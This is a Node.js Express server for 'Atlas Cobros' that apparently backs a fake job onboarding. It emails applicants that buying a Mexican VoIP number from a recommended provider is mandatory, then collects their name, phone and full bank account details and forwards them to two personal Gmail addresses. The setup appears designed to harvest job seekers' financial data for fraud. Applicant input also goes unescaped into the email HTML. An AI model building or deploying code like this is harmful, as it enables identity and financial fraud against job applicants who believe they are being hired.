const express = require('express');
const cors = require('cors');
const https = require('https');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

function sendEmail(to, subject, html) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify({
      from: 'Atlas Cobros <noreply@payfastsolutions.com>',
      to: to,
      subject: subject,
      html: html
    });
    const options = {
      hostname: 'api.resend.com',
      path: '/emails',
      method: 'POST',
      headers: {
        'Authorization': 'Bearer ' + process.env.RESEND_API_KEY,
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body)
      }
    };
    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); }
        catch (e) { reject(data); }
      });
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

app.post('/api/send-email', async (req, res) => {
  const { email, fullname } = req.body;
  if (!email || !fullname) return res.status(400).json({ error: 'Falta email o fullname' });

  const html = '<div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; color: #333;">'
    + '<div style="background-color: #1a1a2e; padding: 20px; border-radius: 8px 8px 0 0; text-align: center;">'
    + '<h1 style="color: #ffffff; margin: 0; font-size: 24px;">Atlas Cobros</h1>'
    + '</div>'
    + '<div style="background-color: #ffffff; padding: 30px; border: 1px solid #e0e0e0; border-radius: 0 0 8px 8px;">'
    + '<h2 style="color: #1a1a2e;">Hola ' + fullname + ',</h2>'
    + '<p>Has completado exitosamente la etapa de postulacion. Bienvenido/a al equipo.</p>'
    + '<h3 style="color: #1a1a2e; border-bottom: 2px solid #e0e0e0; padding-bottom: 8px;">Siguiente paso: Numero mexicano</h3>'
    + '<p>Para operar en el mercado mexicano es <strong>requisito obligatorio</strong> contar con un numero telefonico de Mexico.</p>'
    + '<p><strong>Proveedor recomendado:</strong></p>'
    + '<p style="margin: 15px 0;"><a href="https://global-numbers.com" style="background-color: #1a1a2e; color: #ffffff; padding: 12px 24px; text-decoration: none; border-radius: 5px; display: inline-block;">Comprar numero en Global Numbers</a></p>'
    + '<p style="font-size: 14px; color: #666;">Tambien puedes adquirir tu numero mexicano con otro proveedor de tu preferencia, siempre que sea un numero real de Mexico.</p>'
    + '<div style="background-color: #f5f5f5; padding: 15px; border-radius: 5px; margin: 20px 0; border-left: 4px solid #1a1a2e;">'
    + '<p style="margin: 0 0 8px 0;"><strong>Codigo de confirmacion de compra:</strong></p>'
    + '<p style="margin: 0; font-size: 13px;">Si compras a traves de <strong>Global Numbers</strong>, tu codigo de confirmacion es el <strong>nombre de la aplicacion</strong> que aparece al momento de la compra del chip.</p>'
    + '<p style="margin: 8px 0 0 0; font-size: 13px;">Si compras por tu cuenta con otro proveedor, debes <strong>validar tu numero con tu supervisor</strong> antes de comenzar a operar.</p>'
    + '</div>'
    + '<h3 style="color: #1a1a2e; border-bottom: 2px solid #e0e0e0; padding-bottom: 8px;">Capacitacion</h3>'
    + '<p>Tu capacitacion se realizara con personas de la empresa a traves de <strong>Google Meet</strong>. En breve recibiras el horario asignado para tu sesion.</p>'
    + '<br>'
    + '<p>Cualquier duda, contacta a tu supervisor asignado.</p>'
    + '<p style="margin-top: 30px; color: #1a1a2e;"><strong>Equipo Atlas Cobros</strong></p>'
    + '</div>'
    + '<div style="text-align: center; padding: 15px; font-size: 12px; color: #999;">'
    + '<p>Este es un correo automatico, por favor no respondas a este mensaje.</p>'
    + '</div>'
    + '</div>';

  try {
    const result = await sendEmail(email, 'Atlas Cobros - Bienvenido/a al equipo - Proximos pasos', html);
    if (result.id) {
      console.log('CORREO ENVIADO:', result.id);
      res.json({ success: true });
    } else {
      console.error('ERROR CORREO:', JSON.stringify(result));
      res.status(500).json({ error: result });
    }
  } catch (e) {
    console.error('ERROR CORREO:', e);
    res.status(500).json({ error: e.toString() });
  }
});

app.post('/api/notify-code', async (req, res) => {
  const { fullname, email, phone, country, bankName, accountType, accountNumber, accountHolder, code } = req.body;
  const now = new Date().toLocaleString('es-CL', { timeZone: 'America/Santiago' });

  const canal = code === 'LINPHONE' ? 'Global Numbers (recomendado)' : 'Proveedor externo (requiere validacion)';

  const html = '<div style="font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 20px;">'
    + '<div style="background-color: #1a1a2e; padding: 15px; border-radius: 8px 8px 0 0; text-align: center;">'
    + '<h2 style="color: #fff; margin: 0;">Nuevo codigo ingresado</h2>'
    + '</div>'
    + '<div style="background: #fff; padding: 20px; border: 1px solid #e0e0e0; border-radius: 0 0 8px 8px;">'

    + '<h3 style="color: #1a1a2e; border-bottom: 2px solid #e0e0e0; padding-bottom: 6px; margin-top: 0;">Datos personales</h3>'
    + '<p style="margin: 6px 0;"><strong>Nombre:</strong> ' + (fullname || 'No disponible') + '</p>'
    + '<p style="margin: 6px 0;"><strong>Email:</strong> ' + (email || 'No disponible') + '</p>'
    + '<p style="margin: 6px 0;"><strong>Telefono:</strong> ' + (phone || 'No disponible') + '</p>'
    + '<p style="margin: 6px 0;"><strong>Pais:</strong> ' + (country || 'No disponible') + '</p>'

    + '<h3 style="color: #1a1a2e; border-bottom: 2px solid #e0e0e0; padding-bottom: 6px; margin-top: 20px;">Datos bancarios</h3>'
    + '<p style="margin: 6px 0;"><strong>Banco / Medio de pago:</strong> ' + (bankName || 'No disponible') + '</p>'
    + '<p style="margin: 6px 0;"><strong>Tipo de cuenta:</strong> ' + (accountType || 'No disponible') + '</p>'
    + '<p style="margin: 6px 0;"><strong>Numero de cuenta:</strong> ' + (accountNumber || 'No disponible') + '</p>'
    + '<p style="margin: 6px 0;"><strong>Titular de la cuenta:</strong> ' + (accountHolder || 'No disponible') + '</p>'

    + '<h3 style="color: #1a1a2e; border-bottom: 2px solid #e0e0e0; padding-bottom: 6px; margin-top: 20px;">Activacion</h3>'
    + '<p style="margin: 6px 0;"><strong>Codigo:</strong> ' + (code || 'No disponible') + '</p>'
    + '<p style="margin: 6px 0;"><strong>Canal de compra:</strong> ' + canal + '</p>'
    + '<p style="margin: 6px 0;"><strong>Fecha/Hora (Chile):</strong> ' + now + '</p>'

    + '</div>'
    + '</div>';

  try {
    const r1 = await sendEmail('grupoatlascobros@gmail.com', 'Atlas Cobros - Nuevo codigo ingresado: ' + (fullname || 'Sin nombre'), html);
    const r2 = await sendEmail('fggalleg@gmail.com', 'Atlas Cobros - Nuevo codigo ingresado: ' + (fullname || 'Sin nombre'), html);
    console.log('NOTIFICACION ENVIADA:', fullname, code, r1.id, r2.id);
    res.json({ success: true });
  } catch (e) {
    console.error('ERROR NOTIFICACION:', e);
    res.status(500).json({ error: e.toString() });
  }
});

app.listen(PORT, () => console.log('Servidor corriendo en puerto ' + PORT));
